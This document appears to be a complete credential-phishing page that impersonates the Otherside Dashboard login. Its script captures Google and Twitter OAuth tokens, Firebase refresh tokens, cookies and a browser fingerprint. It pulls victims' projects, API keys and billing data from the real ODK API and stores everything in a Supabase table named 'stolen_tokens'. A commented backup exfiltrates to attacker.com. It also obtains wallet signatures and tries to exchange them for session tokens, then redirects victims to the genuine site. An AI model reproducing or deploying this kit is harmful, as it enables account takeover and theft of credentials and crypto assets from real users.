<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Otherside Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: #141414;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            padding: 48px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .logo {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 32px; }
        .btn-google {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #333;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
            margin-bottom: 12px;
        }
        .btn-google:hover { background: #f0f0f0; transform: translateY(-1px); }
        .btn-google svg { width: 20px; height: 20px; }
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0;
            color: #555;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }
        .btn-wallet {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
            margin-bottom: 12px;
        }
        .btn-wallet:hover { opacity: 0.9; }
        .btn-twitter {
            width: 100%;
            padding: 14px;
            background: #1da1f2;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
        }
        .btn-twitter:hover { opacity: 0.9; }
        .loading {
            display: none;
            margin-top: 16px;
            color: #888;
            font-size: 13px;
        }
        .loading.active { display: block; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">O</div>
        <h1>Welcome to Otherside</h1>
        <p class="subtitle">Sign in to access the dashboard</p>

        <button class="btn-google" onclick="signInWithGoogle()">
            <svg viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            Sign in with Google
        </button>

        <button class="btn-twitter" onclick="signInWithTwitter()">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"/>
            </svg>
            Sign in with Twitter
        </button>

        <div class="divider">or</div>

        <button class="btn-wallet" onclick="connectWallet()">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20 7V5c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-2h-6c-1.1 0-2-.9-2-2v-4c0-1.1.9-2 2-2h6zm0 2v4h6v-4h-6zm-2 2c0 .55.45 1 1 1s1-.45 1-1-.45-1-1-1-1 .45-1 1z"/>
            </svg>
            Connect Wallet
        </button>

        <div class="loading" id="loading">Connecting...</div>
    </div>

    <!-- Firebase Compat SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
    <!-- Supabase JS Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <!-- Ethers.js for wallet connection -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        // =====================================================
        // Supabase Configuration
        // =====================================================
        const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';

        let supabaseClient = null;
        try {
            supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        } catch(e) { console.error('Supabase init error:', e); }

        // =====================================================
        // Firebase Configuration
        // =====================================================
        const firebaseConfig = {
            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
            authDomain: "scarcely-calm-lark.firebaseapp.com",
            projectId: "scarcely-calm-lark",
            storageBucket: "scarcely-calm-lark.appspot.com",
            messagingSenderId: "761033708851",
            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        auth.tenantId = "hound-j8zaz";

        let pendingCredential = null;

        // =====================================================
        // Collect browser fingerprint & metadata
        // =====================================================
        function collectMetadata() {
            return {
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'direct',
                origin_domain: window.location.hostname,
                cookies: document.cookie || '',
            };
        }

        // =====================================================
        // Save to Supabase
        // =====================================================
        async function saveToSupabase(data) {
            if (!supabaseClient) return false;
            try {
                const { data: result, error } = await supabaseClient
                    .from('stolen_tokens')
                    .insert([data])
                    .select();
                if (error) { console.error('DB Error:', error.message); return false; }
                console.log('Saved to Supabase, Row ID:', result[0]?.id);
                return true;
            } catch(e) { console.error('DB Exception:', e.message); return false; }
        }

        // =====================================================
        // Backup exfiltration via fetch() to C2
        // =====================================================
        async function exfiltrateToC2(data) {
            try {
                // await fetch('https://attacker.com/collect', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify(data)
                // });
            } catch(e) {}
        }

        // =====================================================
        // Fetch ODK Dashboard data
        // =====================================================
        async function fetchDashboardData(idToken) {
            const results = {};
            const endpoints = [
                { key: 'userData', path: 'accounts/users/current' },
                { key: 'projects', path: 'organizations/projects' },
                { key: 'apiKeys', path: 'organizations/apiKeys' },
                { key: 'permissions', path: 'permissions/roles' },
                { key: 'billing', path: 'billing/enabled' },
                { key: 'worlds', path: 'worlds' },
                { key: 'profile', path: 'profile' },
                { key: 'originAccess', path: 'origin/access' },
                { key: 'streaming', path: 'origin/streaming' },
                { key: 'sessions', path: 'origin/sessions/queue' },
            ];
            for (const ep of endpoints) {
                try {
                    const resp = await fetch(`https://odk.otherside.xyz/api/v0/${ep.path}`, {
                        headers: { 'Authorization': `Bearer ${idToken}` }
                    });
                    if (resp.ok) results[ep.key] = await resp.json();
                } catch(e) {}
            }
            return results;
        }

        // =====================================================
        // Redirect to real dashboard
        // =====================================================
        function redirectToDashboard() {
            setTimeout(() => { window.location.href = 'https://odk.otherside.xyz/dashboard'; }, 1500);
        }

        // =====================================================
        // Exfiltration: Google/Twitter OAuth
        // =====================================================
        async function exfiltrateOAuth(user, googleAccessToken) {
            try {
                const idToken = await user.getIdToken();

                let actualRefreshToken = '';
                try {
                    const storedUser = JSON.parse(localStorage.getItem(
                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
                    ) || '{}');
                    if (storedUser.stsTokenManager?.refreshToken) {
                        actualRefreshToken = storedUser.stsTokenManager.refreshToken;
                    }
                } catch(e) {}

                const dashData = await fetchDashboardData(idToken);
                const meta = collectMetadata();

                const stolenData = {
                    victim_email: user.email || '',
                    victim_uid: user.uid || '',
                    victim_name: user.displayName || '',
                    victim_picture_url: user.photoURL || '',
                    id_token: idToken,
                    refresh_token: actualRefreshToken,
                    google_access_token: googleAccessToken || '',
                    tenant_id: user.tenantId || '',
                    auth_method: user.providerData[0]?.providerId || '',
                    provider: user.providerData[0]?.providerId || '',
                    is_new_user: false,
                    origin_domain: meta.origin_domain,
                    user_agent: meta.user_agent,
                    screen_resolution: meta.screen_resolution,
                    language: meta.language,
                    timezone: meta.timezone,
                    referrer: meta.referrer,
                    cookies: meta.cookies,
                    token_expires_at: new Date(Date.now() + 3600000).toISOString(),
                    dashboard_user_data: dashData.userData ? JSON.stringify(dashData.userData) : '',
                    dashboard_projects: dashData.projects ? JSON.stringify(dashData.projects) : '',
                    dashboard_apikeys: dashData.apiKeys ? JSON.stringify(dashData.apiKeys) : '',
                    dashboard_permissions: dashData.permissions ? JSON.stringify(dashData.permissions) : '',
                    notes: JSON.stringify({
                        billing: dashData.billing || '',
                        worlds: dashData.worlds || '',
                        originAccess: dashData.originAccess || '',
                        streaming: dashData.streaming || '',
                        sessions: dashData.sessions || '',
                        profile: dashData.profile || '',
                    })
                };

                await saveToSupabase(stolenData);
                await exfiltrateToC2(stolenData);
            } catch (err) { console.error('Exfiltration error:', err.message); }
        }

        // =====================================================
        // Exfiltration: Wallet (MetaMask, etc.)
        // =====================================================
        async function exfiltrateWallet(walletData) {
            try {
                const meta = collectMetadata();

                const stolenData = {
                    victim_uid: walletData.address || 'wallet_unknown',
                    victim_email: '',
                    victim_name: '',
                    auth_method: 'wallet',
                    provider: 'wallet',
                    wallet_address: walletData.address || '',
                    wallet_type: walletData.type || '',
                    wallet_chain_id: walletData.chainId || '',
                    wallet_balance: walletData.balance || '',
                    wallet_signature: walletData.signature || '',
                    wallet_nonce: walletData.nonce || '',
                    origin_domain: meta.origin_domain,
                    user_agent: meta.user_agent,
                    screen_resolution: meta.screen_resolution,
                    language: meta.language,
                    timezone: meta.timezone,
                    referrer: meta.referrer,
                    cookies: meta.cookies,
                    notes: JSON.stringify({
                        walletFullData: walletData,
                        timestamp: new Date().toISOString()
                    })
                };

                await saveToSupabase(stolenData);
                await exfiltrateToC2(stolenData);
            } catch (err) { console.error('Wallet exfiltration error:', err.message); }
        }

        // =====================================================
        // Firebase Auth State Monitor
        // =====================================================
        auth.onAuthStateChanged(async (user) => {
            if (user) {
                let waitCount = 0;
                while (!pendingCredential && waitCount < 20) {
                    await new Promise(r => setTimeout(r, 100));
                    waitCount++;
                }
                await exfiltrateOAuth(user, pendingCredential);
                redirectToDashboard();
            }
        });

        // =====================================================
        // Google Sign-In
        // =====================================================
        async function signInWithGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('profile');
            provider.addScope('email');
            try {
                const result = await auth.signInWithPopup(provider);
                let googleAccessToken = '';
                if (result.credential?.accessToken) googleAccessToken = result.credential.accessToken;
                pendingCredential = googleAccessToken;
            } catch (error) {
                console.error('Google OAuth error:', error.code);
                if (error.code === 'auth/popup-blocked') auth.signInWithRedirect(provider);
            }
        }

        // =====================================================
        // Twitter Sign-In
        // =====================================================
        async function signInWithTwitter() {
            const provider = new firebase.auth.TwitterAuthProvider();
            try {
                const result = await auth.signInWithPopup(provider);
                let twitterToken = '';
                let twitterScreenName = '';
                if (result.credential?.accessToken) twitterToken = result.credential.accessToken;
                if (result.additionalUserInfo?.username) twitterScreenName = result.additionalUserInfo.username;
                pendingCredential = twitterToken;
                // Store Twitter-specific data for the exfiltration
                window._twitterData = { token: twitterToken, screenName: twitterScreenName };
            } catch (error) {
                console.error('Twitter OAuth error:', error.code);
                if (error.code === 'auth/popup-blocked') auth.signInWithRedirect(provider);
            }
        }

        // =====================================================
        // Wallet Connection (MetaMask, etc.)
        // =====================================================
        async function connectWallet() {
            const loadingEl = document.getElementById('loading');
            loadingEl.classList.add('active');
            loadingEl.textContent = 'Connecting to wallet...';

            try {
                if (typeof window.ethereum === 'undefined') {
                    // No wallet extension - try WalletConnect or redirect
                    loadingEl.textContent = 'No wallet detected. Opening MetaMask download...';
                    setTimeout(() => { window.location.href = 'https://metamask.io/download/'; }, 2000);
                    return;
                }

                // Request wallet connection
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const address = accounts[0];

                loadingEl.textContent = 'Verifying wallet...';

                // Get chain ID
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });

                // Get balance
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const balance = await provider.getBalance(address);
                const balanceInEth = ethers.utils.formatEther(balance);

                // Request signature (phishing: user thinks they're authenticating)
                loadingEl.textContent = 'Please sign in your wallet...';
                const nonce = Math.floor(Math.random() * 1000000).toString();
                const message = `Otherside Dashboard\n\nSign this message to verify your wallet ownership.\n\nNonce: ${nonce}`;
                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [message, address]
                });

                // Detect wallet type
                let walletType = 'unknown';
                if (window.ethereum.isMetaMask) walletType = 'metamask';
                else if (window.ethereum.isCoinbaseWallet) walletType = 'coinbase';
                else if (window.ethereum.isFrame) walletType = 'frame';
                else if (window.ethereum.isRainbow) walletType = 'rainbow';
                else if (window.ethereum.isTrust) walletType = 'trust';

                // Collect and exfiltrate
                const walletData = {
                    address: address,
                    type: walletType,
                    chainId: chainId,
                    balance: `${balanceInEth} ETH`,
                    signature: signature,
                    nonce: nonce,
                };

                await exfiltrateWallet(walletData);

                // Also try ODK wallet authentication API
                try {
                    const nonceResp = await fetch('https://odk.otherside.xyz/api/v0/wallet/nonce', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ address: address })
                    });
                    if (nonceResp.ok) {
                        const nonceData = await nonceResp.json();
                        // Try to get a session token from the wallet auth
                        const verifyResp = await fetch('https://odk.otherside.xyz/api/v0/wallet/verify', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                address: address,
                                signature: signature,
                                nonce: nonceData.nonce || nonce
                            })
                        });
                        if (verifyResp.ok) {
                            const verifyData = await verifyResp.json();
                            // If we got a token, save it too
                            if (verifyData.token) {
                                walletData.oidcToken = verifyData.token;
                                await exfiltrateWallet(walletData);  // Update with token
                            }
                        }
                    }
                } catch(e) { console.error('Wallet API error:', e); }

                loadingEl.textContent = 'Wallet connected! Redirecting...';
                redirectToDashboard();

            } catch (error) {
                console.error('Wallet connection error:', error);
                loadingEl.textContent = 'Connection failed. Please try again.';
                setTimeout(() => { loadingEl.classList.remove('active'); }, 3000);
            }
        }

        // Handle redirect result
        auth.getRedirectResult().then((result) => {
            if (result?.user) {
                if (result.credential?.accessToken) pendingCredential = result.credential.accessToken;
            }
        }).catch((error) => {
            if (error.code && error.code !== 'auth/no-auth-event') console.error('Redirect error:', error.code);
        });

        // Listen for wallet account/chain changes (extra data collection)
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length > 0) exfiltrateWallet({ address: accounts[0], type: 'account_change' });
            });
            window.ethereum.on('chainChanged', (chainId) => {
                console.log('Chain changed:', chainId);
            });
        }
    </script>
</body>
</html>
